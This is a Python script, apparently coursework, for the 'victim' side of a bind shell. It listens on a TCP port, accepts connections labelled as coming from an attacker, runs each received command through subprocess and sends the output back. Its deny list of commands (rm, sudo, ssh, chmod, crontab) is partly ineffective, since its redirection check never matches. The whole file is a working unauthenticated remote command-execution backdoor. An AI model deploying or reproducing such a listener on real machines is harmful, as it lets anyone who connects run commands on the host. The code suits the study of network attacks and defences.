import argparse
import re
import sys
import socket
import threading
import ipaddress
import subprocess

IP = ""
PORT = 0
MAX_CONNECTIONS = 10
BUFFER_SIZE = 1024

UNSUPPORTED_COMMANDS = ["rm", "mv", "mkdir", "touch", "tail", "apt", "sudo", "brew", "nano", "man", "ssh", "chmod", "crontab", "gdb"]
UNSUPPORTED_REDIRECTIONS = [">", "<", ">>", "|"]

def parse_arguments():
    global IP, PORT

    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", type=str, required=True, help="Victim\'s IP address")
    parser.add_argument("-p", "--port", type=int, required=True, help="Victim\'s port")

    try:
        args = parser.parse_args()

    except SystemExit as e:
        parser.print_help()
        sys.exit()

    IP = args.ip
    PORT = args.port

def handle_arguments():
    if PORT <= 0:
        print("Error: Port must be a positive integer. Try again.")
        sys.exit()

    if not ipaddress.ip_address(IP):
        print("Error: IP address must be a valid IP address. Try again.")
        sys.exit()


def create_socket():
    print("Victim - Creating socket")
    try:
        victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.error as e:
        print("Victim - Error creating socket: {}".format(e))
        sys.exit()

    return victim_socket


def bind_socket(victim_socket):
    print("Victim - Binding socket")
    try:
        victim_socket.bind((IP, PORT))

    except socket.error as e:
        print("Victim - Error binding socket: {}".format(e))
        sys.exit()


def listen_socket(victim_socket):
    print("Victim - Listening on {}:{}".format(IP, PORT))
    try:
        victim_socket.listen(MAX_CONNECTIONS)

    except socket.error as e:
        print("Victim - Error listening socket: {}".format(e))
        sys.exit()


# Threading is fine since no shared preference
def accept_connection(victim_socket):
    attacker_socket = None
    print("Victim - Accepting connection")
    while True:
        try:
            attacker_socket, attacker_address = victim_socket.accept()

        except socket.error as e:
            print("Victim - Error accepting connection: {}".format(e))
            attacker_socket.close()

        threading.Thread(target=handle_attacker_request, args=(attacker_socket,)).start()


def handle_attacker_request(attacker_socket):
    attacker_data = ""

    try:
        attacker_data = attacker_socket.recv(BUFFER_SIZE).decode("utf-8")

    except socket.error as e:
        print("Victim - Error receiving data: {}".format(e))
        attacker_socket.close()
    print("------------------------------------")
    print("Victim - Handling attacker request:")
    if attacker_data:
        print(attacker_data)
        output = handle_command(attacker_data)
        attacker_socket.send(output.encode("utf-8"))
    else:
        print("Victim - Client disconnected")

def handle_command(attacker_data):
    commands = attacker_data.split(" ")

    if commands[0] in UNSUPPORTED_COMMANDS or commands in UNSUPPORTED_REDIRECTIONS:
        print("Victim - Unsupported command: {}".format(commands[0]))
        return "Unsupported command. Try again."

    return execute_command(commands)

def execute_command(commands):
    result = subprocess.run(commands, capture_output=True,
                            text=True)  # capture_output=True captures stdout and stderr, text=True decodes the output.
    output = ""

    if result.returncode == 0:
        print("Command executed successfully!")
        if result.stdout:
            output = result.stdout

        if result.stderr:
            output = result.stderr
    else:
        print(f"Victim - Command failed with return code {result.returncode}")
        print("Error:", result.stderr)

    return output

if __name__ == '__main__':
    parse_arguments()
    handle_arguments()
    vi_socket = create_socket()
    bind_socket(vi_socket)
    listen_socket(vi_socket)
    accept_connection(vi_socket)

    vi_socket.close()